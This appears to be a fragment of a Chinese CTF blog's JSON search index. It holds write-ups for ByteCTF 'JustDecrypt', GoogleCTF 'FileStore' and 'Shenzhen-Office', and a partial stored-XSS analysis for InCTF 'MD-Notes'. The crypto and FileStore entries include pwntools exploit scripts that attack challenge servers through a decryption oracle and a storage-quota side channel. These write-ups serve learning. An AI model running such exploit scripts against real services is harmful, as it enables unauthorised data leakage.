the flag!对应的ciphertext，接着在获得的密文后添加'00' * 30来覆盖nonce，得到我们一开始恢复 H 所使用的 $CIPH_K(I_0)$ 高s位 （在实施攻击前我们需要用密文 '00'*512 来覆盖nonce从而控制Decrypt流 {Cipher内部状态} ），计算 $MSB_{s}(CIPH_K(I_{0}))\\oplus0X1F$ 其中0X1F是我们在密文后添加的Byte个数，利用 unpad() 中的逻辑 s[:-s[-1]] 我们能够去除多余密文所带来的杂乱明文，这样便能够成功攻击该密码方案，获得FLAG。 0x3 EXPLOITED import hashlib from tqdm import tqdm import pickle from curtsies.fmtfuncs import red from pwn import * import codecs import binascii import re io = remote('39.105.181.182', 30001) target_plaintext = b\"Hello, I'm a Bytedancer. Please give me the flag!\" def interactive_pharse1(io): temp = io.recvuntil(b'Give me XXXX \u003e') tar_hash = temp[temp.find(b'==')+3:temp.find(b'==')+3+64].decode() proof_back = temp[temp.find(b'XXXX')+5:temp.find(b'XXXX')+5+28].decode() proof_prefix = hash_collid(tar_hash, proof_back) io.sendline(proof_prefix.encode()) return io def hash_collid(tar_hash, proof_back): with open('./prefix', 'rb') as f: prefix_set = pickle.load(f) for prefix in tqdm(prefix_set): temp = prefix + proof_back if hashlib.sha256(temp.encode()).hexdigest() == tar_hash: print(red('[*]Found! ') + prefix) return prefix def interactive_pharse2(io, cip, flag=0): io.recvuntil(b'Please enter your cipher in hex \u003e') io.sendline(cip) io.recvuntil(b' Your plaintext in hex: \\n') plaintext = io.recvuntil(b","date":"2021-11-17","objectID":"/2021-10-20-justdecrypt/:0:0","tags":["Crypto","ByteCTF2021"],"title":"JustDecrypt","uri":"/2021-10-20-justdecrypt/"},{"categories":null,"content":"0X1 Source Code # Copyright 2021 Google LLC # # Licensed under the Apache License, Version 2.0 (the \"License\"); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # https://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an \"AS IS\" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. import os, secrets, string, time from flag import flag def main(): # It's a tiny server... blob = bytearray(2**16) files = {} used = 0 # Use deduplication to save space. def store(data): nonlocal used MINIMUM_BLOCK = 16 MAXIMUM_BLOCK = 1024 part_list = [] while data: prefix = data[:MINIMUM_BLOCK] ind = -1 bestlen, bestind = 0, -1 while True: ind = blob.find(prefix, ind+1) if ind == -1: break length = len(os.path.commonprefix([data, bytes(blob[ind:ind+MAXIMUM_BLOCK])])) if length \u003e bestlen: bestlen, bestind = length, ind if bestind != -1: part, data = data[:bestlen], data[bestlen:] part_list.append((bestind, bestlen)) else: part, data = data[:MINIMUM_BLOCK], data[MINIMUM_BLOCK:] blob[used:used+len(part)] = part part_list.append((used, len(part))) used += len(part) assert used \u003c= len(blob) fid = \"\".join(secrets.choice(string.ascii_letters+string.digits) for i in range(16)) files[fid] = part_list return fid def load(fid): data = [] for ind, length in files[fid]: data.append(blob[ind:ind+length]) return b\"\".join(data) print(\"Welcome to our file storage solution.\") # Store the flag as one of the files. store(bytes(flag, \"utf-8\")) while True: print() print(\"Menu:\") print(\"- load\") print(\"- store\") print(\"- status\") print(\"- exit\") choice = input().strip().lower() if choice == \"load\": print(\"Send me the file id...\") fid = input().strip() data = load(fid) print(data.decode()) elif choice == \"store\": print(\"Send me a line of data...\") data = input().strip() fid = store(bytes(data, \"utf-8\")) print(\"Stored! Here's your file id:\") print(fid) elif choice == \"status\": print(\"User: ctfplayer\") print(\"Time: %s\" % time.asctime()) kb = used / 1024.0 kb_all = len(blob) / 1024.0 print(\"Quota: %0.3fkB/%0.3fkB\" % (kb, kb_all)) print(\"Files: %d\" % len(files)) elif choice == \"exit\": break else: print(\"Nope.\") break try: main() except Exception: print(\"Nope.\") time.sleep(1) 0x2 ANALYSIS 简要的审计chall源码可以发现如下几个事实： 程序为我们提供了三种功能：load，store，status load：我们提供一个文件UID，系统返回我们该文件中的内容 store：系统存储我们输入信息并返回该文件对应的UID status：系统虚拟磁盘所使用的存储空间大小 Flag存储在系统中并且大小至少（这里说是至少是因为该文件系统使用了一种压缩）为26B 文件系统将整个存储池分为多个Blocks，每个Blocks的大小为16B，存储采用最长前缀匹配压缩存储，如果两个文件（HEX表示）具有匹配的前缀，则后者的加入不需要新占用存储空间（不需要一个新的Block），每个文件以线性表结构描述，表中的内容为Block（index，len） 我们能够利用该文件系统的特性泄露flag信息，即使用BF逐字符Store进文件系统，观察Status中已使用内存大小变化来确定我们输入的字符是否正确 0X3 EXPLOITED from pwn import * from time import sleep import string, time def main(): match = \"0.026\" def process_conn_action(store_item): nonlocal match conn = remote(\"filestore.2021.ctfcompetition.com\", 1337) conn.recv() conn.send('store\\r\\n') conn.recv() conn.send(store_item + '\\r\\n') conn.recv() conn.send('status\\r\\n') info = conn.recvall(timeout=1) info = info.decode() info = info[info.find('Quota') +7: info.find('Quota') +12] if match == info: return True else: return False # print(process_conn_action('c')) probchar = ['0', '1', '3', '4', 'c', 'f', 'i', 'n', 'p', 't', 'u', 'C', 'F', 'M', 'R', \\ 'T', '_', '{', '}', 'd'] # dict = string.printable # for char in string.printable: # if char not in probchar and process_conn_action(char): # probchar.append(char) # print(probchar) # print(len(probchar)) # print(len(probchar)) flag = \"}\" # 实践中发现前序遍历会有Bug，便将这里改为由后向前匹配 while True: for character in probchar: temp = character + flag print(\"Temp: \" + temp) print(\"Current Character: \" + character) if process_conn_action(temp): flag = character + flag print(\"Found! ! !\") sleep(1) break else: continue main() # CT","date":"2021-11-04","objectID":"/2021-11-04-filestore/:0:0","tags":["GoogleCTF2021","MISC"],"title":"FileStore","uri":"/2021-11-04-filestore/"},{"categories":null,"content":"0X1 简要概述 题目给出了两个文件： -encodings (这里面涉及的内容均为该Chall的提示) -chall.txt （根据encodings编码后的内容） 本题的基本思路就是根据encodings所给的hints去一层层的解chall.txt中的编码。 0x2 EXPLOITED chall.txt中的内容大致如下， chall.txt中的内容\" chall.txt中的内容 观察到chall.txt文件中的内容均为可见字符，根据encodings中的提示{a weird base, much higher than base64} 考虑是base家族的编码并且该编码不常见。文件中的内容均为Unicode字符（UCS-2编码），范围达到65535，Googling base65535，找到一个在线Decoder。解码后得到以下内容， 解码后内容\" 解码后内容 均为Hex表示，使用xxd将其转换为二进制文件， xxd -r -p base65535Decode.txt base65535_decoded.bin 使用file查看base65535_decoded.bin的类型，见下图 查看文件类型\" 查看文件类型 我们得到一张jpeg格式的图片，转换扩展名打开图片，我们得到下图， 提取出的 jpeg 文件\" 提取出的 jpeg 文件 谢谢老番茄让我知道这是什么东西，这是画家蒙德里安的著作，根据encodings中的提示{a language named after a painter}，我们googling一下可以找到该语言Piet，并且还有其在线解释器，不过我把图片丢进去没啥效果，好像不是这副图片，我们得继续挖掘一下这幅图片，祭出我所有关于图片隐写的工具。在尝试了多种工具后，我在exiftool中提取到了有趣的数据， exiftool base65535_decoded.jpeg \u003e Piet.txt 稍微处理掉一些我们不感兴趣的信息，得到 处理后得到的文件内容\" 处理后得到的文件内容 看似又是一种奇怪的语言：（ 根据encodings中的提示{a language that is the opposite of good}，我一开始想的是Bad，找了半天没找到，后来我干脆直接去找Good的反义词， good 的反义词\" good 的反义词 在互联网世界遨游了一番后终于确定了那门语言——Evil，故技重施找在线Interpreter，但没找着。无奈只好在主页下载了用Java实现的Interpreter。 用javac编译一下后再执行我们得到的代码（Piet.txt）并将输出结果重定向至Evil.txt。我们又得到了一连串Hex， 代码执行后输出内容\" 代码执行后输出内容 故技重施，用xxd转换为二进制文件，并用file检查文件类型，发现是一个zlib压缩文件，使用zlib-flate解压该文件， zlib-flate -uncompress \u003c Evil.bin \u003e Evil_uncomp 使用File检查该文件，发现是一个gzip包，解压后得到一个Netpbm格式的文件，googling一下， Netpbm (formerly Pbmplus) is an open-source package of graphics programs and a programming library. It is used mainly in the Unix world, where one can find it included in all major open-source operating system distributions, but also works on Microsoft Windows, macOS, and other operating systems.[2] 这时候我们可以将这个图片丢进Piet的Interpreter里了，我们又得到了一连串Hex，重复上述转换过程，最终我们得到一个ASCII文档，其中的内容为 文本文件内容\" 文本文件内容 根据encodings中的提示{language that looks like a rainbow cat}，googling后定位到nya~语言。由于nya~的语法比较简单，我们可以用python自实现。 Command Description n Decrement integer y Increment integer a Put char from ASCII ~ Reset integer to 0 #!/usr/bin/env python3 with open('./Piet_out_uncomp', 'r') as f: data = f.read().splitlines() for sent in data: print(chr(len(sent)-4), end='') 得到一个长整数， 440697918422363183397548356115174111979967632241756381461523275762611555565044345243686920364972358787309560456318193690287799624872508559490789890532367282472832564379215298488385593860832849627398865422864710999039787979733217240717198641619578634620231344233376325369569117210379679868602299244468387044128773681334105139544596909148571184763654886495124023818825988036876333149722377075577809087358356951704469327595398462722928801 这里就不能够再转换为Binary了，至此我们还剩下两个Hints{a language that is too vulgar to write here；a language that ended in ‘ary’ but I don’t remember the full name} 经过一番艰难的Googling之后，我最终确定了剩下的两门语言，Brainfuck和Unary。 上面的大整数可以转换为二进制按照Unary转换表转换为Brainfuck可以识别的语言，使用的Python脚本如下， data = 440697918422363183397548356115174111979967632241756381461523275762611555565044345243686920364972358787309560456318193690287799624872508559490789890532367282472832564379215298488385593860832849627398865422864710999039787979733217240717198641619578634620231344233376325369569117210379679868602299244468387044128773681334105139544596909148571184763654886495124023818825988036876333149722377075577809087358356951704469327595398462722928801 trans2_brain_fuck = bin(data)[3:] dict_map = {'000': '\u003e', '001': '\u003c', '010': '+', '011': '-', '100': '.', '101': ',', '110': '[', '111': ']'} output = '' for i in range(0, len(trans2_brain_fuck), 3): print(trans2_brain_fuck[i:i+3]) output += dict_map[trans2_brain_fuck[i:i+3]] print(output) # [-]\u003e[-]\u003c++++++[\u003e++++++++++\u003c-]\u003e+++++++.\u003c+[\u003e++++++++++\u003c-]\u003e+++++++.\u003c+[\u003e----------\u003c-]\u003e----.\u003c+++++[\u003e++++++++++\u003c-]\u003e+++.\u003c+[\u003e----------\u003c-]\u003e-.\u003c[\u003e----------\u003c-]\u003e----.\u003c+++++[\u003e----------\u003c-]\u003e-------.\u003c[\u003e++++++++++\u003c-]\u003e+.\u003c++++++[\u003e++++++++++\u003c-]\u003e+++.\u003c++++++[\u003e----------\u003c-]\u003e----.\u003c++++[\u003e++++++++++\u003c-]\u003e++++.\u003c+[\u003e++++++++++\u003c-]\u003e+++++.\u003c++++++[\u003e----------\u003c-]\u003e--.\u003c++++[\u003e++++++++++\u003c-]\u003e+++++++.\u003c+[\u003e++++++++++\u003c-]\u003e++++.\u003c++++++[\u003e----------\u003c-]\u003e-.\u003c[\u003e++++++++++\u003c-]\u003e++++.\u003c++++++[\u003e++++++++++\u003c-]\u003e++.\u003c+[\u003e++++++++++\u003c-]\u003e+.\u003c 最后再Googling找","date":"2021-11-04","objectID":"/2021-11-04-shenzhen-office/:0:0","tags":["GoogleCTFBeginner2021","MISC"],"title":"Shenzhen-Office","uri":"/2021-11-04-shenzhen-office/"},{"categories":null,"content":"​ 后端编写语言：GO ​ 前端编写语言：HTML \u0026\u0026 JavaScript ​ 本地镜像搭建：因为众所周知的原因，我们在国内拉取Go依赖镜像时相当的慢，并且有可能根本无法进行连接下载，我们需要在Dockerfile中或使用Go本身去配置代理选项的使用。通过在终端上或在Dockerfile中执行下面的语句我们可以配置国内代理， RUN go env -w GOPROXY=\"https://goproxy.cn,direct\" 业务逻辑分析与代码审查 ​ 代理配置完后我们直接来看题目，直接进入到http://localhost:8080/；页面布局很简单，简要的看上去是一个支持markdown格式的在编辑器，支持在线预览（Preview）与后端保存（Save）功能。 题目页面展示\" 题目页面展示 ​ 我们随便的在编辑框中输入一点内容看看效果， 尝试输入特殊字符\" 尝试输入特殊字符 ​ 可以看到我们输入的内容被进行了过滤编码，\u003c标签开闭合符号显然就在其中，我们考虑是否有某种方式绕过过滤实现XSS,单击保存后我们可以看到下列提示， 保存后提示\" 保存后提示 ​ 进入提示的路径我们可以看到我们输入的经过过滤后的信息。 ​ InCTF为我们提供了一个adminBot，我们可以让它来访问我们提供的页面，考虑是CORS，利用某种方式绕过过滤器继而提交并且存储XSS注入后的恶意页面(Stored XSS）获得admin浏览器中的敏感信息。 ​ 接下来我们开始分析代码 ​ 审计server.go源码，我们发现了对应的路由及其相关方法， route.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", fs)) route.HandleFunc(\"/\", indexHandler) route.HandleFunc(\"/demo\", previewHandler).Methods(\"GET\") route.HandleFunc(\"/api/flag\", flag).Methods(\"GET\") route.HandleFunc(\"/api/filter\", filterHandler).Methods(\"POST\") route.HandleFunc(\"/api/create\", createHandler).Methods(\"POST\") route.HandleFunc(\"/{bucketid}/{postid}\", previewHandler).Methods(\"GET\") route.HandleFunc(\"/_debug\", debug).Methods(\"GET\") ​ /路由到/index.html，在index.html中我们发现preview所提供的功能是通过\u003ciframe\u003e导入进来的并且应用了一个Script文件（/static/app.js）， 15-20行 \u003cdiv class=\"col-md-6\"\u003e \u003ctextarea id=\"input-area\" class=\"form-control\"\u003e\u003c/textarea\u003e \u003c/div\u003e \u003cdiv class=\"col-md-6\"\u003e \u003ciframe id=\"frame-area\" src=\"/demo\" width=\"500\" height=\"300\"\u003e\u003c/iframe\u003e \u003c/div\u003e ​ /static/app.js中定义了我们单击Preview与Save所对应的事件处理逻辑， preview.onclick = function() { console.log(\"Sending Preview..\") frame.contentWindow.postMessage(textarea.value, `http://${document.location.host}/`); return false; } ​ 我们在Docs中查找contentWindow.postMessage()的用法： ​ **window.postMessage()**方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机 (两个页面的模数 Document.domain设置为相同的值) 时，这两个脚本才能相互通信。window.postMessage() 方法提供了一种受控机制来规避此限制，只要正确的使用，这种方法就很安全。 ​ 从广义上讲，一个窗口可以获得对另一个窗口的引用（比如 targetWindow = window.opener），然后在窗口上调用 targetWindow.postMessage() 方法分发一个 MessageEvent 消息。接收消息的窗口可以根据需要自由处理此事件 (en-US)。传递给 window.postMessage() 的参数（比如 message ）将通过消息事件对象暴露给接收消息的窗口。 ​ 语法使用 otherWindow.postMessage(message, targetOrigin, [transfer]); otherWindow 其他窗口的一个引用，比如iframe的contentWindow属性、执行window.open返回的窗口对象、或者是命名过或数值索引的window.frames。 message 将要发送到其他 window的数据。它将会被结构化克隆算法序列化。这意味着你可以不受什么限制的将数据对象安全的传送给目标窗口而无需自己序列化。[1] targetOrigin ​ 通过窗口的origin属性来指定哪些窗口能接收到消息事件，其值可以是字符串\"*\"（表示无限制）或者一个URI。在发送消息的时候，如果目标窗口的协议、主机地址或端口这三者的任意一项不匹配targetOrigin提供的值，那么消息就不会被发送；只有三者完全匹配，消息才会被发送。这个机制用来控制消息可以发送到哪些窗口；例如，当用postMessage传送密码时，这个参数就显得尤为重要，必须保证它的值与这条包含密码的信息的预期接受者的origin属性完全一致，来防止密码被恶意的第三方截获。如果你明确的知道消息应该发送到哪个窗口，那么请始终提供一个有确切值的targetOrigin，而不是*。不提供确切的目标将导致数据泄露到任何对数据感兴趣的恶意站点。 ​ 上述代码中使用http://${document.location.host}/作为targetOrigin限定了message中的信息只能被回传至本页面中index.html，由input-area向frame-area传递 ​ 在preview.js中设置了一个messageEvent监听器，当windows事件触发message事件时会回调用本函数， window.addEventListener(\"message\", (event) =\u003e { console.log(\"Previewing..\") let raw = event.data // input-area data fetch(\"/api/filter\", { method: \"POST\", credentials: \"include\", body: JSON.stringify({ raw: raw }) }) .then(resp =\u003e resp.json()) .then(response =\u003e { console.log(\"Filtered\") document.body.innerHTML = response.Sanitized window.parent.postMessage(response, \"*\"); }); }, false); ​ EventTarget.addEventListener() 方法将指定的监听器注册到 EventTarget 上，当该对象触发指定的事件时，指定的回调函数就会被执行。 事件目标可以是一个文档上的元素 Element,Document和Window或者任何其他支持事件的对象 (比如 XMLHttpRequest)。 target.addEventListener(type, listener, options); type 表示监听事件类型的字符串。 listener 当所监听的事件类型触发时，会接收到一个事件通知（实现了 Event 接口的对象）对象。listener 必须是一个实现了 EventListener 接口的对象，或者是一个函数。有关回调本身的详细信息，请参阅The event listener callback ​ 事件类型参考：https://developer.mozilla.org/zh-CN/docs/Web/Events ​ 该函数将RawData发送至后端GoAPI接口/api/filter中，在这里实现过滤逻辑 server.go {140-171} func filterHandler(w http.ResponseWriter, r *http.Request) { reqBody, _ := ioutil.ReadAll(r.Body) w.Header().Set(\"Content-Type\", \"application/json\") var unsanitized Unsanitized err := json.Unmarshal(reqBody, \u0026unsanitized) if err != nil","date":"2021-10-20","objectID":"/2021-10-20-md-notes/:0:0","tags":["Web","InCTF2021"],"title":"MD-Notes","uri":"/2021-10-20-md-notes/"},{"categories":null,"content":"😏简介 幼年安全工程师。 ","date":"0001-01-01","objectID":"/about/:0:1","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"😉联系方式 📨 wgblike@outlook.com ","date":"0001-01-01","objectID":"/about/:0:2","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"Friends —— 相遇有趣的灵魂 撩月 ","date":"0001-01-01","objectID":"/friends/:0:0","tags":null,"title":"","uri":"/friends/"}]